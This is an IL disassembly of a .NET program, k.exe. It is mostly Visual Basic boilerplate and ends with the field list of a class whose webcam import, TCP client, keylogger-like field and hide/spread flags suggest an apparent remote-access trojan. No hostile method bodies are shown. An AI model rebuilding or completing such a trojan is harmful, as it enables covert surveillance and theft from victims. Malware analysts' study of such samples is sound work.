
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.0.30319.1
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern avicap32.dll
.module extern ntdll
.module extern user32.dll
.module extern kernel32
.module extern user32
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly k
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module k.exe
// MVID: {D8DDF669-AAFF-4AA1-A8E9-50888F9591DE}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x014B0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi k.My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase
{
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class k.My.MyApplication

.class private auto ansi k.My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class k.My.MyComputer

.class private auto ansi sealed beforefieldinit k.My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .class auto ansi sealed nested assembly MyForms
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 19 53 79 73 74 65 6D 2E 57 69 6E 64 6F 77   // ...System.Window
                                                                                                                     73 2E 46 6F 72 6D 73 2E 46 6F 72 6D 12 43 72 65   // s.Forms.Form.Cre
                                                                                                                     61 74 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 13   // ate__Instance__.
                                                                                                                     44 69 73 70 6F 73 65 5F 5F 49 6E 73 74 61 6E 63   // Dispose__Instanc
                                                                                                                     65 5F 5F 12 4D 79 2E 4D 79 50 72 6F 6A 65 63 74   // e__.My.MyProject
                                                                                                                     2E 46 6F 72 6D 73 00 00 )                         // .Forms..
    .field private static class [mscorlib]System.Collections.Hashtable m_FormBeingCreated
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method private static !!T  Create__Instance__<.ctor ([System.Windows.Forms]System.Windows.Forms.Form) T>(!!T Instance) cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       226 (0xe2)
      .maxstack  4
      .locals init (!!T V_0,
               string V_1,
               class [mscorlib]System.Reflection.TargetInvocationException V_2,
               string[] V_3)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brfalse.s  IL_001a

      IL_0008:  ldarga.s   Instance
      IL_000a:  constrained. !!T
      IL_0010:  callvirt   instance bool [System.Windows.Forms]System.Windows.Forms.Control::get_IsDisposed()
      IL_0015:  brfalse    IL_00de

      IL_001a:  ldsfld     class [mscorlib]System.Collections.Hashtable k.My.MyProject/MyForms::m_FormBeingCreated
      IL_001f:  brfalse.s  IL_004d

      IL_0021:  ldsfld     class [mscorlib]System.Collections.Hashtable k.My.MyProject/MyForms::m_FormBeingCreated
      IL_0026:  ldtoken    !!T
      IL_002b:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0030:  callvirt   instance bool [mscorlib]System.Collections.Hashtable::ContainsKey(object)
      IL_0035:  brfalse.s  IL_0057

      IL_0037:  ldstr      "WinForms_RecursiveFormCreate"
      IL_003c:  ldc.i4.0
      IL_003d:  newarr     [mscorlib]System.String
      IL_0042:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Utils::GetResourceString(string,
                                                                                                                         string[])
      IL_0047:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor(string)
      IL_004c:  throw

      IL_004d:  newobj     instance void [mscorlib]System.Collections.Hashtable::.ctor()
      IL_0052:  stsfld     class [mscorlib]System.Collections.Hashtable k.My.MyProject/MyForms::m_FormBeingCreated
      IL_0057:  ldsfld     class [mscorlib]System.Collections.Hashtable k.My.MyProject/MyForms::m_FormBeingCreated
      IL_005c:  ldtoken    !!T
      IL_0061:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0066:  ldnull
      IL_0067:  callvirt   instance void [mscorlib]System.Collections.Hashtable::Add(object,
                                                                                     object)
      .try
      {
        .try
        {
          IL_006c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
          IL_0071:  stloc.0
          IL_0072:  leave.s    IL_00e0

        }  // end .try
        filter
        {
          IL_0074:  isinst     [mscorlib]System.Reflection.TargetInvocationException
          IL_0079:  dup
          IL_007a:  brtrue.s   IL_0080

          IL_007c:  pop
          IL_007d:  ldc.i4.0
          IL_007e:  br.s       IL_0096

          IL_0080:  dup
          IL_0081:  stloc.2
          IL_0082:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0087:  ldloc.2
          IL_0088:  callvirt   instance class [mscorlib]System.Exception [mscorlib]System.Exception::get_InnerException()
          IL_008d:  ldnull
          IL_008e:  ceq
          IL_0090:  ldc.i4.0
          IL_0091:  ceq
          IL_0093:  ldc.i4.0
          IL_0094:  cgt.un
          IL_0096:  endfilter
        }  // end filter
        {  // handler
          IL_0098:  pop
          IL_0099:  ldstr      "WinForms_SeeInnerException"
          IL_009e:  ldc.i4.1
          IL_009f:  newarr     [mscorlib]System.String
          IL_00a4:  stloc.3
          IL_00a5:  ldloc.3
          IL_00a6:  ldc.i4.0
          IL_00a7:  ldloc.2
          IL_00a8:  callvirt   instance class [mscorlib]System.Exception [mscorlib]System.Exception::get_InnerException()
          IL_00ad:  callvirt   instance string [mscorlib]System.Exception::get_Message()
          IL_00b2:  stelem.ref
          IL_00b3:  ldloc.3
          IL_00b4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Utils::GetResourceString(string,
                                                                                                                             string[])
          IL_00b9:  stloc.1
          IL_00ba:  ldloc.1
          IL_00bb:  ldloc.2
          IL_00bc:  callvirt   instance class [mscorlib]System.Exception [mscorlib]System.Exception::get_InnerException()
          IL_00c1:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor(string,
                                                                                               class [mscorlib]System.Exception)
          IL_00c6:  throw

        }  // end handler
      }  // end .try
      finally
      {
        IL_00c7:  ldsfld     class [mscorlib]System.Collections.Hashtable k.My.MyProject/MyForms::m_FormBeingCreated
        IL_00cc:  ldtoken    !!T
        IL_00d1:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
        IL_00d6:  callvirt   instance void [mscorlib]System.Collections.Hashtable::Remove(object)
        IL_00db:  endfinally
      }  // end handler
      IL_00dc:  br.s       IL_00e0

      IL_00de:  ldarg.0
      IL_00df:  ret

      IL_00e0:  ldloc.0
      IL_00e1:  ret
    } // end of method MyForms::Create__Instance__

    .method private instance void  Dispose__Instance__<([System.Windows.Forms]System.Windows.Forms.Form) T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  2
      .locals init (!!T V_0)
      IL_0000:  ldarg.1
      IL_0001:  constrained. !!T
      IL_0007:  callvirt   instance void [System]System.ComponentModel.Component::Dispose()
      IL_000c:  ldarg.1
      IL_000d:  ldloca.s   V_0
      IL_000f:  initobj    !!T
      IL_0015:  ldloc.0
      IL_0016:  stobj      !!T
      IL_001b:  ret
    } // end of method MyForms::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyForms::.ctor

    .method public strict virtual instance bool 
            Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  2
      .locals init (bool V_0)
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyForms::Equals

    .method public strict virtual instance int32 
            GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  1
      .locals init (int32 V_0)
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyForms::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  1
      .locals init (class [mscorlib]System.Type V_0)
      IL_0000:  ldtoken    k.My.MyProject/MyForms
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyForms::GetType

    .method public strict virtual instance string 
            ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  1
      .locals init (string V_0)
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyForms::ToString

  } // end of class MyForms

  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public strict virtual instance bool 
            Equals(object o) cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  2
      .locals init (bool V_0)
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public strict virtual instance int32 
            GetHashCode() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  1
      .locals init (int32 V_0)
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  1
      .locals init (class [mscorlib]System.Type V_0)
      IL_0000:  ldtoken    k.My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public strict virtual instance string 
            ToString() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  1
      .locals init (string V_0)
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       16 (0x10)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_000e

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  ret

      IL_000e:  ldarg.0
      IL_000f:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       16 (0x10)
      .maxstack  2
      .locals init (!!T V_0)
      IL_0000:  ldarg.1
      IL_0001:  ldloca.s   V_0
      IL_0003:  initobj    !!T
      IL_0009:  ldloc.0
      IL_000a:  stobj      !!T
      IL_000f:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  1
      .locals init (!T V_0)
      IL_0000:  ldsfld     !0 class k.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class k.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class k.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T k.My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyApplication> m_AppObjectProvider
  .field private static initonly class k.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyProject/MyForms> m_MyFormsObjectProvider
  .field private static initonly class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       51 (0x33)
    .maxstack  8
    IL_0000:  newobj     instance void class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyComputer>::.ctor()
    IL_0005:  stsfld     class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyComputer> k.My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyApplication>::.ctor()
    IL_000f:  stsfld     class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyApplication> k.My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class k.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class k.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> k.My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyProject/MyForms>::.ctor()
    IL_0023:  stsfld     class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyProject/MyForms> k.My.MyProject::m_MyFormsObjectProvider
    IL_0028:  newobj     instance void class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyProject/MyWebServices>::.ctor()
    IL_002d:  stsfld     class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyProject/MyWebServices> k.My.MyProject::m_MyWebServicesObjectProvider
    IL_0032:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class k.My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  1
    .locals init (class k.My.MyComputer V_0)
    IL_0000:  ldsfld     class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyComputer> k.My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class k.My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  1
    .locals init (class k.My.MyApplication V_0)
    IL_0000:  ldsfld     class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyApplication> k.My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  1
    .locals init (class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User V_0)
    IL_0000:  ldsfld     class k.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> k.My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class k.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class k.My.MyProject/MyForms 
          get_Forms() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  1
    .locals init (class k.My.MyProject/MyForms V_0)
    IL_0000:  ldsfld     class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyProject/MyForms> k.My.MyProject::m_MyFormsObjectProvider
    IL_0005:  callvirt   instance !0 class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyProject/MyForms>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Forms

  .method assembly specialname static class k.My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  1
    .locals init (class k.My.MyProject/MyWebServices V_0)
    IL_0000:  ldsfld     class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyProject/MyWebServices> k.My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class k.My.MyProject/ThreadSafeObjectProvider`1<class k.My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class k.My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class k.My.MyComputer k.My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class k.My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class k.My.MyApplication k.My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User k.My.MyProject::get_User()
  } // end of property MyProject::User
  .property class k.My.MyProject/MyForms Forms()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 08 4D 79 2E 46 6F 72 6D 73 00 00 )          // ...My.Forms..
    .get class k.My.MyProject/MyForms k.My.MyProject::get_Forms()
  } // end of property MyProject::Forms
  .property class k.My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class k.My.MyProject/MyWebServices k.My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class k.My.MyProject

.class public auto ansi k.OK
       extends [mscorlib]System.Object
{
  .field private uint8[] b
  .field private class [System]System.Net.Sockets.TcpClient C
  .field private bool Cn
  .field private class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field private class [mscorlib]System.IO.FileStream FS
  .field private string lastcap
  .field private class [mscorlib]System.IO.FileInfo LO
  .field private class [mscorlib]System.IO.MemoryStream MeM
  .field private object MT
  .field private string H
  .field private string P
  .field private class k.kl kq
  .field private object PLG
  .field private bool Cnon
  .field private string PH
  .field private string DR
  .field private string EXE
  .field private bool BD
  .field private bool Idr
  .field private bool IsF
  .field private bool Isu
  .field private string RG
  .field private string sf
  .field private string VN
  .field private string VR
  .field private string Y
  .field private int32 klen
  .field private bool Hid
  .field private bool Spr
